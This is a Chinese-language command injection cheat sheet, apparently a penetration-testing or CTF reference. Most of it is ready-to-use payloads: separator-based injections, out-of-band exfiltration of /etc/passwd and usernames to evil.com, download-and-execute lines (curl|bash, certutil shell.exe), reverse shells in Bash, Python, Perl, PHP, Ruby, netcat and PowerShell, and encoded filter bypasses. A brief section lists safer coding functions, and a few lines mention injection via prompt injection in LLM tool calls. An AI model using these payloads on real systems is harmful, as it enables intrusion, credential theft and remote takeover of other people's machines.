# 命令注入 (Command Injection)

## 原理

应用程序将用户输入拼接到系统命令中执行，未做充分过滤，攻击者通过命令分隔符、引号、变量等注入额外命令。

## 攻击链

### 1. 探测注入点

```http
# 常见场景
?ping=127.0.0.1
?ip=127.0.0.1
?host=example.com
?cmd=ls
?file=name.txt
?name=test
```

### 2. 命令分隔符

```bash
# Linux
;          # 顺序执行
|          # 管道
||         # 或（前一个失败才执行）
&&         # 与（前一个成功才执行）
&          # 后台执行
\n         # 换行
$()        # 命令替换
``       # 命令替换

# Windows
&          # 顺序执行
|          # 管道
||         # 或
&&         # 与
\n         # 换行
```

### 3. 基础 payload

```bash
# Linux
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
127.0.0.1||id
127.0.0.1`id`
127.0.0.1$(id)
127.0.0.1;cat /etc/passwd
127.0.0.1;curl http://evil.com/|bash
127.0.0.1;bash -i >& /dev/tcp/evil.com/4444 0>&1

# Windows
127.0.0.1&whoami
127.0.0.1|whoami
127.0.0.1&&dir
127.0.0.1&certutil -urlcache -split -f http://evil.com/shell.exe C:\shell.exe
```

### 4. 盲注（无回显）

```bash
# 时间盲注
127.0.0.1;sleep 5
127.0.0.1|ping -c 5 127.0.0.1
127.0.0.1&timeout 5

# OOB（带外）
127.0.0.1;curl http://evil.com/$(whoami)
127.0.0.1;ping -c 1 $(whoami).evil.com
127.0.0.1;nslookup $(id).evil.com
127.0.0.1;curl http://evil.com/ -d @/etc/passwd

# Windows OOB
127.0.0.1&nslookup cmd.evil.com
127.0.0.1&ping -n 1 cmd.evil.com
127.0.0.1&certutil -urlcache -split -f http://evil.com/$(whoami) C:\temp
```

### 5. 反弹 shell

```bash
# Bash
bash -i >& /dev/tcp/evil.com/4444 0>&1
bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in(4444,inet_aton("evil.com")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'

# PHP
php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("evil.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat
nc -e /bin/sh evil.com 4444
nc evil.com 4444 -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444 >/tmp/f

# Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('evil.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text].encoding)::ASCII.GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()}};$client.Close()"
```

## 绕过技巧

### 1. 空格过滤

```bash
# 用 ${IFS} 替代空格
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# 用 < 替代
cat</etc/passwd
cat<>/etc/passwd

# 用 { } 分隔
{cat,/etc/passwd}

# 用 $@ 替代
c$@at /etc/passwd

# 用 %09 (Tab) 替代
cat%09/etc/passwd

# 用变量
X=$'cat\x20/etc/passwd';$X
```

### 2. 关键字过滤

```bash
# 过滤 cat
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd
nl /etc/passwd
sort /etc/passwd
strings /etc/passwd
grep '' /etc/passwd
rev /etc/passwd | rev
awk '{print}' /etc/passwd
sed '' /etc/passwd
xxd /etc/passwd
base64 /etc/passwd

# 过滤 ls
echo *
dir
find .
echo $(pwd)/*

# 过滤 flag
cat /etc/fla''g
cat /etc/fla\g
cat /etc/fla$()g
cat /etc/fla${x}g
cat /etc/fla$@g
ca$@t /etc/fla$@g
c''at /etc/fla''g
c\at /etc/fla\g

# 变量拼接
a=fl;b=ag;cat /etc/$a$b
a=ca;b=t;$a$b /etc/passwd

# base64 编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# hex 编码
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# oct 编码
printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
```

### 3. 命令分隔符过滤

```bash
# 过滤 ; | & 
# 用换行符
127.0.0.1%0aid
127.0.0.1%0a%0aid

# 用 %0d (回车)
127.0.0.1%0did

# 用 $()
127.0.0.1$(id)

# 用反引号
127.0.0.1`id`
```

### 4. 命令限制

```bash
# 受限 shell (rbash)
# 绕过：
# 1. 通过编辑器
vi
:!/bin/sh

# 2. 通过 more/less
more /etc/passwd
!/bin/sh

# 3. 通过 awk
awk 'BEGIN {system("/bin/sh")}'

# 4. 通过 find
find / -name "test" -exec /bin/sh \;

# 5. 通过 python
python -c 'import os;os.system("/bin/sh")'

# 6. 通过 SSH
ssh user@target -t "bash --noprofile"

# 7. 通过环境变量
BASH_ENV=() { :;}; /bin/sh
```

### 5. 长度限制

```bash
# 命令长度受限
# 用文件写入
>ip
>127.0.0.1
ls -t > a
sh a

# 用 wget
wget evil.com/a -O a
sh a

# 用 curl
curl evil.com/a > a
sh a
```

## 各语言命令注入

### PHP

```php
# 危险函数
system($cmd)
exec($cmd)
shell_exec($cmd)
passthru($cmd)
popen($cmd, 'r')
proc_open($cmd, ...)
`$cmd`
pcntl_exec($cmd)

# 防护
escapeshellarg($input)
escapeshellcmd($input)
```

### Python

```python
# 危险
os.system(cmd)
os.popen(cmd)
subprocess.call(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
commands.getoutput(cmd)

# 安全
subprocess.call(['cmd', 'arg1', 'arg2'])  # 不用 shell=True
shlex.quote(input)
```

### Java

```java
// 危险
Runtime.getRuntime().exec(cmd)
new ProcessBuilder(cmd).start()

// 安全
// 使用参数数组，不使用 shell
```

### Node.js

```javascript
// 危险
child_process.exec(cmd)
child_process.execSync(cmd)

// 安全
child_process.execFile('cmd', ['arg1', 'arg2'])
```

## 2024-2026 新技术点

### 1. Windows 新技巧

```powershell
# PowerShell 7 新特性
pwsh -c "cmd"

# 通过环境变量
$env:cmd='id';iex $env:cmd

# 通过 CLSID
# 利用 COM 对象执行命令
```

### 2. Linux 新技巧

```bash
# 通过 /proc/self/fd
cat /proc/self/fd/0 <<< "id"

# 通过 /dev/tcp
exec 5<>/dev/tcp/evil.com/4444
cat <&5 | while read line; do $line 2>&1 >&5; done

# 通过 nsenter
nsenter -t 1 -m -u -i -n sh
```

### 3. 容器环境命令注入

```bash
# 通过 /proc/1/root
# 通过 cgroup
# 通过 cap 操纵
```

### 4. CI/CD 命令注入

```yaml
# GitHub Actions
# 通过 PR 触发命令注入
# ${{ github.event.pull_request.title }}
```

### 5. AI 应用命令注入

```python
# LLM 应用中的命令注入
# 通过 prompt injection 触发工具调用
# 工具调用时拼接用户输入
```

### 6. GraphQL 命令注入

```graphql
# 通过 mutation 参数注入
mutation {
  exec(cmd: "id;curl evil.com")
}
```

### 7. 现代框架命令注入

```python
# Django
# 通过 subprocess 调用
# 通过 os.popen

# Flask
# 通过 shell=True
```

### 8. Serverless 命令注入

```python
# AWS Lambda
# 通过环境变量
# 通过事件参数
```

## 工具推荐

- **commix** — 命令注入自动化
- **CMDi** — 命令注入检测
- **Burp Suite Active Scan** — 自动检测

## 参考链接

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
